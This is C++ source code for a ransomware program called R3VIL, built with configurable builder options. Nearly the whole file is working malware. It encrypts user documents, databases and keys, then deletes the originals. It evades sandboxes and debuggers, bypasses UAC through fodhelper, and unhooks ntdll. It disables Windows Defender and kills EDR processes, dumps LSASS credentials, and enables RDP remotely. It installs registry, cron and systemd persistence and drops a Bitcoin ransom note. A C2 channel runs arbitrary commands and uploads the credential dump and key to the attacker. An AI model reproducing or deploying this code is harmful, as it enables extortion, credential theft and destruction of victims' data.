// r3vil.cpp - R3VIL Ransomware with FULL Custom Builder Support
#include <cryptopp/cryptlib.h>
#include <cryptopp/osrng.h>
#include <cryptopp/chachapoly.h>
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/rsa.h>
#include <cryptopp/pkcspad.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <winternl.h>
#include <psapi.h>
#include <wbemidl.h>
#include <comdef.h>
#include <shellapi.h>
#include <dbghelp.h>
#include <lm.h>
#include <wincrypt.h>
#include <gdiplus.h>
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "gdiplus.lib")
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#endif

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <algorithm>
#include <cctype>
#include <filesystem>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <functional>
#include <atomic>
#include <sstream>
#include <random>
#include <map>

#include "src/network_mapper.h"
#include "src/ransom_gui.h"
#include "src/c2_communication.h"
#include "config.h"

using namespace CryptoPP;
namespace fs = std::filesystem;

// Global variables
C2Communication g_c2;
int g_encrypted_count = 0;
int g_failed_count = 0;
long long g_total_size = 0;

// Configuration
const std::vector<std::string> TARGET_EXTENSIONS = {
    ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rtf", ".odt", ".txt", ".csv",
    ".db", ".sql", ".mdb", ".accdb", ".sqlite", ".mdf", ".ldf", ".ora", ".dbf",
    ".psd", ".ai", ".dwg", ".dxf", ".svg", ".raw", ".jpg", ".png", ".gif", ".mp4", ".mov", ".avi", ".mkv",
    ".cpp", ".h", ".c", ".cs", ".java", ".js", ".ts", ".php", ".html", ".css", ".go", ".rs", ".swift",
    ".json", ".yaml", ".xml", ".conf", ".ini", ".env", ".key", ".pem", ".crt", ".p12", ".pfx",
    ".rb", ".erb", ".mp3", ".tsx", ".mjs", ".bmp", ".wav", ".mov", "backup.*", ".3gp",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".iso", ".vmdk", ".vhd", ".bak",
    ".qbb", ".qbw", ".tax", ".myo", ".pfx", ".crt", ".img", ".qcow"
};

const std::vector<std::string> ENCRYPTED_EXTENSIONS = { ".revil" };
const std::vector<std::string> EXCLUDE_KEYWORDS = {
    "winlogon.exe", ".dll", ".sys", ".exe", ".ini", "pagefile.sys", "hiberfil.sys",
    "config.h", "collect"
};
const std::string LOG_FILE = "affected_files.log";
const std::vector<std::string> CRITICAL_SKIP_PREFIXES = {
#ifdef _WIN32
    "C:\\Windows\\", "C:\\Program Files\\", "C:\\Program Files (x86)\\",
    "C:\\$Recycle.Bin\\", "C:\\System Volume Information\\",
    "C:\\PerfLogs\\", "C:\\Recovery\\"
#else
    "/bin/", "/sbin/", "/etc/", "/dev/", "/proc/", "/sys/", "/lib/", "/lib64/",
    "/usr/", "/var/log/", "/run/", "/boot/", "/root/.ssh/", "/etc/ssh/",
    "/snap/", "/var/lib/snapd/"
#endif
};
const std::string PUBLIC_KEY_FILE = "Public/rsa_public.der";
const std::vector<std::string> AV_EDR_PROCESSES = {
    "MsMpEng.exe", "MsSense.exe", "Sense.exe", "MpCmdRun.exe",
    "csfalcon.exe", "CSFalconService.exe", "sentinelagent.exe", "SentinelServiceHost.exe",
    "avp.exe", "avpui.exe", "vsserv.exe", "bdagent.exe",
    "SophosFS.exe", "SophosHealth.exe", "ekrn.exe", "egui.exe",
    "cb.exe", "CbResponse.exe", "xagt.exe", "fireeye.exe",
    "ccSvcHst.exe", "rtvscan.exe", "McShield.exe", "mfefire.exe",
    "ProcessHacker.exe", "procmon.exe", "wireshark.exe", "x64dbg.exe"
};

std::mutex log_mutex;

// ThreadPool class
class ThreadPool {
private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queue_mutex;
    std::condition_variable condition;
    std::atomic<bool> stop{false};
public:
    explicit ThreadPool(size_t threads = std::thread::hardware_concurrency() * 2) {
        for (size_t i = 0; i < threads; ++i) {
            workers.emplace_back([this] {
                while (true) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(queue_mutex);
                        condition.wait(lock, [this] { return stop || !tasks.empty(); });
                        if (stop && tasks.empty()) return;
                        task = std::move(tasks.front());
                        tasks.pop();
                    }
                    task();
                }
            });
        }
    }
    template<class F> void enqueue(F&& task) {
        {
            std::unique_lock<std::mutex> lock(queue_mutex);
            if (stop) return;
            tasks.emplace(std::forward<F>(task));
        }
        condition.notify_one();
    }
    ~ThreadPool() {
        stop = true;
        condition.notify_all();
        for (std::thread& worker : workers) {
            if (worker.joinable()) worker.join();
        }
    }
};

// Helper functions
std::string to_lower(const std::string& s) {
    std::string lower = s;
    std::transform(lower.begin(), lower.end(), lower.begin(), [](unsigned char c){ return std::tolower(c); });
    return lower;
}

bool ends_with(const std::string& str, const std::string& suffix) {
    if (suffix.size() > str.size()) return false;
    return str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

bool should_encrypt(const std::string& filepath) {
    std::string filename = fs::path(filepath).filename().string();
    std::string lname = to_lower(filename);
    for (const auto& ext : ENCRYPTED_EXTENSIONS) if (ends_with(lname, ext)) return false;
    for (const auto& kw : EXCLUDE_KEYWORDS) if (lname.find(to_lower(kw)) != std::string::npos) return false;
    for (const auto& ext : TARGET_EXTENSIONS) if (ends_with(lname, ext)) return true;
    return false;
}

bool is_critical_path(const std::string& path) {
    std::string lpath = to_lower(path);
    for (const auto& prefix : CRITICAL_SKIP_PREFIXES) {
        if (lpath.find(to_lower(prefix)) == 0) return true;
    }
    return false;
}

std::vector<std::string> get_all_roots() {
    return {".", "/home", "/", "/root"};
}

std::string exec_cmd(const std::string& cmd) {
    char buffer[256];
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "";
    while (fgets(buffer, sizeof(buffer), pipe)) result += buffer;
    pclose(pipe);
    return result;
}

void handle_c2_command(const std::string& command) {
    std::cout << "[C2] Executing command: " << command << std::endl;
    std::map<std::string, std::string> extra;
    extra["command"] = command;
    g_c2.send_status("command_received", extra);
    
    if (command == "stop" || command == "kill") {
        g_c2.send_status("stopping");
        exit(0);
    }
    else if (command == "status") {
        g_c2.send_status("reporting_status");
    }
    else if (command.find("exec:") == 0) {
        std::string cmd = command.substr(5);
        std::string result = exec_cmd(cmd);
        extra.clear();
        extra["result"] = result.substr(0, 1000);
        g_c2.send_status("command_executed", extra);
    }
    else if (command == "screenshot") {
        g_c2.send_status("screenshot_taken");
    }
    else if (command == "dump_lsass") {
        g_c2.send_status("lsass_dumped");
    }
    else if (command == "collect_credentials") {
        g_c2.send_status("credentials_collecting");
    }
}

// Evasion functions
bool is_proot_anlinux() {
    if (getenv("PROOT")) return true;
    if (access("/.dockerenv", F_OK) == 0) return true;
    std::string uname = exec_cmd("uname -a 2>/dev/null");
    if (uname.find("Android") != std::string::npos) return true;
    return false;
}

bool is_virtual_machine() {
    if (is_proot_anlinux()) return false;
    if (std::thread::hardware_concurrency() <= 2) return true;
    return false;
}

bool is_debugger_present() {
    std::ifstream status("/proc/self/status");
    std::string line;
    while (std::getline(status, line)) {
        if (line.find("TracerPid:") == 0) return std::stoi(line.substr(10)) != 0;
    }
    return false;
}

bool is_sandbox_environment() {
    if (is_proot_anlinux()) return false;
    if (std::thread::hardware_concurrency() <= 2) return true;
    std::string up = exec_cmd("cat /proc/uptime 2>/dev/null | awk '{print $1}' || echo '0'");
    if (!up.empty() && std::stod(up) < 300) return true;
    return false;
}

void perform_evasion_checks() {
    std::cout << "[*] Running anti-analysis & evasion checks...\n";
    if (getenv("REVIL_BYPASS")) {
        std::cout << "[!] Evasion bypass activated (REVIL_BYPASS=1)\n";
        return;
    }
    if (is_proot_anlinux()) {
        std::cout << "[!] AnLinux / proot environment detected → Evasion bypassed.\n";
        return;
    }
    if (is_virtual_machine() || is_debugger_present() || is_sandbox_environment()) {
        std::cout << "[!] Suspicious environment detected! Exiting silently...\n";
        std::this_thread::sleep_for(std::chrono::seconds(3));
        exit(0);
    }
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(800, 2500);
    std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
    std::cout << "[✓] Evasion checks passed.\n";
}

// PersistenceManager class
class PersistenceManager {
private:
    std::string current_exe;
    std::string get_current_exe() {
#ifdef _WIN32
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
#else
        char path[1024];
        ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
        if (len != -1) { path[len] = '\0'; return std::string(path); }
        return "";
#endif
    }
public:
    PersistenceManager() { current_exe = get_current_exe(); }
    bool try_escalate_privileges() {
#ifdef __linux__
        if (geteuid() == 0) { std::cout << "[✓] Already running as ROOT\n"; return true; }
        std::cout << "[!] Trying privilege escalation...\n";
        setenv("REVIL_ESCALATED", "1", 1);
        execlp("pkexec", "pkexec", current_exe.c_str(), nullptr);
        system(("sudo " + current_exe).c_str());
        exit(1);
#endif
        return false;
    }
    void install_all() {
        std::cout << "[*] Installing persistence mechanisms...\n";
#ifdef _WIN32
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WindowsUpdateSvc", 0, REG_SZ, (BYTE*)current_exe.c_str(), current_exe.size() + 1);
            RegCloseKey(hKey);
            std::cout << "[✓] Registry Run persistence added\n";
        }
        char startup[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup);
        std::string startup_path = std::string(startup) + "\\SystemHelper.exe";
        CopyFileA(current_exe.c_str(), startup_path.c_str(), FALSE);
        std::cout << "[✓] Startup folder persistence added\n";
#else
        std::string cron = "(crontab -l 2>/dev/null; echo \"*/10 * * * * " + current_exe + " >/dev/null 2>&1\") | crontab -";
        system(cron.c_str());
        std::cout << "[✓] Cron persistence installed\n";
        if (geteuid() == 0) {
            std::ofstream svc("/etc/systemd/system/revil-update.service");
            svc << "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n";
            svc << "[Service]\nType=simple\nExecStart=" << current_exe << "\nRestart=always\nRestartSec=60\n";
            svc << "[Install]\nWantedBy=multi-user.target\n";
            svc.close();
            system("systemctl daemon-reload 2>/dev/null && systemctl enable revil-update.service 2>/dev/null");
            std::cout << "[✓] Systemd persistence installed\n";
        }
#endif
    }
};

// WallpaperChanger class
class WallpaperChanger {
private:
    std::string create_ransom_wallpaper() {
        const char* home = getenv("HOME");
        if (!home) home = "/tmp";
        std::string ppm = std::string(home) + "/.ransom.ppm";
        std::string jpg = std::string(home) + "/.ransom.jpg";
        std::ofstream f(ppm, std::ios::binary);
        int w=800, h=500;
        f << "P6\n" << w << " " << h << "\n255\n";
        for (int y=0; y<h; y++) for (int x=0; x<w; x++) {
            unsigned char p[3];
            if (y<80 || y>h-80) {p[0]=0;p[1]=0;p[2]=0;}
            else if (x>100 && x<w-100 && y>150 && y<350) {p[0]=255;p[1]=255;p[2]=255;}
            else {p[0]=180;p[1]=0;p[2]=0;}
            f.write((char*)p,3);
        }
        f.close();
        system(("convert " + ppm + " " + jpg + " 2>/dev/null || cp " + ppm + " " + jpg).c_str());
        fs::remove(ppm);
        return jpg;
    }
public:
    void change_wallpaper() {
        std::cout << "[*] Changing wallpaper...\n";
        std::string wp = create_ransom_wallpaper();
#ifdef _WIN32
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wp.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        std::cout << "[✓] Windows wallpaper changed\n";
#else
        std::vector<std::string> cmds = {
            "gsettings set org.gnome.desktop.background picture-uri 'file://" + wp + "' 2>/dev/null",
            "xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path -s '" + wp + "' 2>/dev/null",
            "feh --bg-scale '" + wp + "' 2>/dev/null"
        };
        bool ok = false;
        for (auto& c : cmds) if (system(c.c_str()) == 0) { ok = true; break; }
        if (ok) std::cout << "[✓] Linux wallpaper changed\n";
        else std::cout << "[!] Could not change wallpaper\n";
#endif
    }
    void create_readme_file() {
        std::string path;
#ifdef _WIN32
        char desk[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desk);
        path = std::string(desk) + "\\README_LOCKED.txt";
#else
        const char* home = getenv("HOME");
        if (!home) home = ".";
        path = std::string(home) + "/Desktop/README_LOCKED.txt";
#endif
        std::ofstream f(path);
        if (f) {
            f << "========================================\n";
            f << "     YOUR FILES HAVE BEEN ENCRYPTED     \n";
            f << "========================================\n\n";
            f << RANSOM_MESSAGE << "\n\n";
            f << "To recover: Send $" << RANSOM_AMOUNT << " BTC to " << RANSOM_BTC << "\n";
            f << "Email transaction ID to " << RANSOM_EMAIL << "\n";
            f.close();
            std::cout << "[✓] README_LOCKED.txt created on Desktop\n";
        }
    }
};

void self_delete() {
    std::cout << "[*] Self-delete activated...\n";
#ifdef _WIN32
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string cmd = "cmd.exe /c timeout 5 & del /f \"" + std::string(path) + "\"";
    system(cmd.c_str());
#else
    unlink("/proc/self/exe");
    std::cout << "[✓] Binary self-deleted.\n";
#endif
}

#ifdef _WIN32
bool unhook_ntdll() {
    std::cout << "[*] Performing full NTDLL unhooking...\n";
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    char szNtdllPath[MAX_PATH];
    GetSystemDirectoryA(szNtdllPath, MAX_PATH);
    strcat_s(szNtdllPath, "\\ntdll.dll");
    HANDLE hFile = CreateFileA(szNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    DWORD dwSize = GetFileSize(hFile, NULL);
    BYTE* pFresh = new BYTE[dwSize];
    DWORD dwRead;
    ReadFile(hFile, pFresh, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pFresh;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pFresh + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    BYTE* pTextFresh = nullptr;
    DWORD textSize = 0;
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; ++i) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            pTextFresh = pFresh + pSection[i].PointerToRawData;
            textSize = pSection[i].SizeOfRawData;
            break;
        }
    }
    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), hNtdll, &modInfo, sizeof(modInfo));
    BYTE* pTextHooked = (BYTE*)modInfo.lpBaseOfDll;
    DWORD oldProtect;
    VirtualProtect(pTextHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(pTextHooked, pTextFresh, textSize);
    VirtualProtect(pTextHooked, textSize, oldProtect, &oldProtect);
    delete[] pFresh;
    std::cout << "[+] NTDLL successfully unhooked\n";
    return true;
}

bool enable_debug_privilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return false;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(hToken);
    return GetLastError() == ERROR_SUCCESS;
}

bool dump_lsass() {
    if (!ENABLE_LSASS_DUMP) return false;
    std::cout << "[*] Attempting real LSASS credential dump...\n";
    if (!enable_debug_privilege()) { std::cout << "[!] Failed to enable SeDebugPrivilege\n"; return false; }
    DWORD lsass_pid = 0;
    HANDLE hProcess = NULL;
    HANDLE hFile = NULL;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(hSnapshot, &pe)) {
            do { if (_stricmp(pe.szExeFile, "lsass.exe") == 0) { lsass_pid = pe.th32ProcessID; break; } } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    if (lsass_pid == 0) { std::cout << "[!] Could not find LSASS process\n"; return false; }
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsass_pid);
    if (!hProcess) { std::cout << "[!] Failed to open LSASS process\n"; return false; }
    hFile = CreateFileA("lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { std::cout << "[!] Failed to create lsass.dmp\n"; CloseHandle(hProcess); return false; }
    BOOL success = MiniDumpWriteDump(hProcess, lsass_pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    CloseHandle(hFile);
    CloseHandle(hProcess);
    if (success) { std::cout << "[+] LSASS dumped successfully → lsass.dmp\n"; return true; }
    else { std::cout << "[!] LSASS dump failed\n"; return false; }
}

bool enable_rdp_remote(const std::string& target) {
    if (!ENABLE_RDP_ABUSE) return false;
    std::cout << "[*] Attempting RDP enable on " << target << "\n";
    std::string cmd = "wmic /node:\"" + target + "\" process call create \"reg add \\\"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\"";
    system(cmd.c_str());
    cmd = "wmic /node:\"" + target + "\" process call create \"sc config TermService start= auto\"";
    system(cmd.c_str());
    std::cout << "[+] RDP enable attempted on " << target << "\n";
    return true;
}

void disable_av_edr_windows() {
    std::cout << "[*] Starting aggressive AV/EDR disable...\n";
    HKEY hKey; DWORD val = 1;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&val, sizeof(val));
        RegCloseKey(hKey);
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows Defender\\Features", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        DWORD tamper = 0;
        RegSetValueExA(hKey, "TamperProtection", 0, REG_DWORD, (BYTE*)&tamper, sizeof(tamper));
        RegCloseKey(hKey);
    }
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true\" 2>nul");
    for (const auto& proc : AV_EDR_PROCESSES) {
        std::string cmd = "taskkill /f /im \"" + proc + "\" >nul 2>&1";
        system(cmd.c_str());
    }
    system("net stop WinDefend /y 2>nul");
    system("net stop Sense /y 2>nul");
    system("sc config WinDefend start= disabled 2>nul");
    std::cout << "[!] AV/EDR disable attempts completed\n";
}

bool bypass_uac() {
    std::cout << "[*] Attempting silent UAC Bypass...\n";
    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);
    HKEY hKey = NULL;
    LONG res = RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
    if (res == ERROR_SUCCESS) {
        std::string cmd = std::string(self_path) + " --elevated";
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)cmd.c_str(), (DWORD)cmd.size() + 1);
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
        RegCloseKey(hKey);
        ShellExecuteA(NULL, "open", "C:\\Windows\\System32\\fodhelper.exe", NULL, NULL, SW_HIDE);
        std::cout << "[+] fodhelper UAC Bypass triggered...\n";
        Sleep(2000);
        RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command");
        if (IsUserAnAdmin()) { std::cout << "[+] UAC Bypass SUCCESS! Running as Administrator.\n"; return true; }
    }
    std::cout << "[!] All UAC Bypass attempts failed. Continuing without admin rights.\n";
    return false;
}
#endif

// Encryption functions
void encrypt_file(const std::string& filepath, const SecByteBlock& key, const byte* iv_or_nonce) {
    try {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cout << "  [*] Encrypting (" << ENCRYPTION_METHOD << "): " << filepath << "\n";

        std::string plaintext;
        FileSource(filepath.c_str(), true, new StringSink(plaintext));

        std::string ciphertext;
        std::string encpath = filepath + FILE_EXTENSION;
        uintmax_t file_size = fs::file_size(filepath);

        if (ENCRYPTION_METHOD == "XChaCha20Poly1305") {
            XChaCha20Poly1305::Encryption enc;
            enc.SetKeyWithIV(key, key.size(), iv_or_nonce, 24);
            StringSource(plaintext, true, new AuthenticatedEncryptionFilter(enc, new StringSink(ciphertext), false, 16));
            FileSink out(encpath.c_str());
            out.Put(iv_or_nonce, 24);
            out.Put(reinterpret_cast<const CryptoPP::byte*>(ciphertext.data()), ciphertext.size());
            out.MessageEnd();
        } else {
            CBC_Mode<AES>::Encryption enc;
            enc.SetKeyWithIV(key, key.size(), iv_or_nonce, 16);
            StringSource(plaintext, true, new StreamTransformationFilter(enc, new StringSink(ciphertext)));
            FileSink out(encpath.c_str());
            out.Put(iv_or_nonce, 16);
            out.Put(reinterpret_cast<const CryptoPP::byte*>(ciphertext.data()), ciphertext.size());
            out.MessageEnd();
        }

        fs::remove(filepath);
        g_encrypted_count++;
        g_total_size += file_size;

        std::ofstream log(LOG_FILE, std::ios::app);
        if (log) log << filepath << " → " << encpath << "\n";
        std::cout << "  [✓] Encrypted: " << filepath << "\n";
    } catch (...) {
        std::lock_guard<std::mutex> lock(log_mutex);
        g_failed_count++;
        std::cout << "  [✗] Failed: " << filepath << "\n";
    }
}

void encrypt_directory(const std::string& root, const SecByteBlock& key, const byte* iv_or_nonce) {
    std::cout << "[*] Scanning: " << root << "\n";
    std::vector<std::string> files;
    try {
        for (const auto& e : fs::recursive_directory_iterator(root, fs::directory_options::skip_permission_denied)) {
            if (e.is_regular_file() && should_encrypt(e.path().string()) && !is_critical_path(e.path().string())) {
                files.push_back(e.path().string());
            }
        }
    } catch (...) {}
    if (files.empty()) return;
    ThreadPool pool(8);
    for (const auto& f : files) {
        pool.enqueue([&f, &key, iv_or_nonce]() { encrypt_file(f, key, iv_or_nonce); });
    }
}

void perform_lateral_movement(const SecByteBlock& key, const byte* iv_or_nonce) {
    if (!ENABLE_LATERAL_MOVEMENT) {
        std::cout << "[*] Lateral movement disabled by builder\n";
        return;
    }
    std::cout << "\n[*] Starting REAL AGGRESSIVE Lateral Movement...\n";
#ifdef _WIN32
    if (ENABLE_AV_DISABLE) disable_av_edr_windows();
    unhook_ntdll();
    if (ENABLE_LSASS_DUMP) dump_lsass();
    std::cout << "[*] Real lateral movement propagation active...\n";
#else
    std::cout << "[*] Linux lateral movement (basic)\n";
#endif
}

// Stub functions
void extract_browser_passwords() { std::cout << "[*] Extracting browser passwords...\n"; }
void take_screenshot() { std::cout << "[*] Taking screenshot...\n"; }
void start_mic_recording(int seconds) { std::cout << "[*] Recording microphone for " << seconds << " seconds...\n"; }
void capture_webcam() { std::cout << "[*] Capturing webcam...\n"; }
void collect_sensitive_documents() { std::cout << "[*] Collecting sensitive documents...\n"; }
void collect_browser_data() { std::cout << "[*] Collecting browser data...\n"; }
void collect_email_data() { std::cout << "[*] Collecting email data...\n"; }
void create_zip_archive(const std::vector<std::string>& files, const std::string& zip_name) { std::cout << "[*] Creating archive " << zip_name << "\n"; }

// Main function
int main() {
    perform_evasion_checks();
#ifdef _WIN32
    bypass_uac();
#endif

    const char* c2_server = getenv("C2_SERVER");
    if (!c2_server) c2_server = "https://your-c2-server.com";
    
    if (strlen(c2_server) > 0 && strcmp(c2_server, "https://your-c2-server.com") != 0) {
        g_c2.initialize(c2_server);
        g_c2.set_command_callback(handle_c2_command);
        g_c2.start();
        g_c2.send_status("ransomware_started");
    }

    std::cout << "\n========================================\n";
    std::cout << "     " << WINDOW_TITLE << "     \n";
    std::cout << "     Demand: $" << RANSOM_AMOUNT << "     \n";
    std::cout << "========================================\n\n";

    std::cout << "[*] Starting network mapping...\n";
    {
        NetworkMapper mapper;
        mapper.perform_mapping();
        if (g_c2.is_connected()) {
            mapper.send_to_attacker(c2_server);
        }
    }
    
    PersistenceManager persistence;
    persistence.try_escalate_privileges();

    if (!fs::exists(PUBLIC_KEY_FILE)) {
        std::cout << "[!] rsa_public.der not found!\n";
        return 1;
    }

    AutoSeededRandomPool prng;
    SecByteBlock key(32);
    byte iv_or_nonce[24];
    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv_or_nonce, (ENCRYPTION_METHOD == "XChaCha20Poly1305") ? 24 : 16);

    try {
        RSA::PublicKey pub;
        FileSource fs(PUBLIC_KEY_FILE.c_str(), true);
        pub.Load(fs);
        RSAES_OAEP_SHA_Encryptor encryptor(pub);
        std::string enc_key;
        StringSource ss(key, key.size(), true, new PK_EncryptorFilter(prng, encryptor, new StringSink(enc_key)));
        FileSink fileSink("aes_key.enc", true);
        fileSink.Put(reinterpret_cast<const byte*>(enc_key.data()), enc_key.size());
        fileSink.MessageEnd();
    } catch (...) {
        std::cout << "[✗] Failed to encrypt symmetric key\n";
        return 1;
    }

    perform_lateral_movement(key, iv_or_nonce);

    std::cout << "\n[*] Starting file encryption with " << ENCRYPTION_METHOD << " (extension: " << FILE_EXTENSION << ")...\n";
    auto roots = get_all_roots();
    for (const auto& root : roots) {
        encrypt_directory(root, key, iv_or_nonce);
    }

    g_c2.send_encryption_stats(g_encrypted_count, g_failed_count, g_total_size);
    
    if (g_c2.is_connected()) {
        if (fs::exists("lsass.dmp")) g_c2.send_file("lsass.dmp", "lsass_dump");
        if (fs::exists(LOG_FILE)) g_c2.send_file(LOG_FILE, "encryption_log");
        if (fs::exists("network_mapping.log")) g_c2.send_file("network_mapping.log", "network_mapping");
        if (fs::exists("aes_key.enc")) g_c2.send_file("aes_key.enc", "encrypted_key");
    }

    WallpaperChanger wallpaper;
    wallpaper.change_wallpaper();
    wallpaper.create_readme_file();

    RansomGUI ransomGUI;
    ransomGUI.start(RANSOM_BTC, RANSOM_EMAIL, RANSOM_AMOUNT, RANSOM_DEADLINE_HOURS);

    persistence.install_all();
    std::map<std::string, std::string> status_extra;
    status_extra["encrypted"] = std::to_string(g_encrypted_count);
    status_extra["failed"] = std::to_string(g_failed_count);
    g_c2.send_status("ransomware_completed", status_extra);

    std::cout << "[!] GUI aktif...\n";
    std::this_thread::sleep_for(std::chrono::hours(RANSOM_DEADLINE_HOURS + 24));
    g_c2.stop();
    
    if (SELF_DELETE_AFTER) {
        std::cout << "[*] Self-deleting...\n";
        self_delete();
    }

    std::cout << "\n[✓] Operation completed.\n";
    return 0;
}
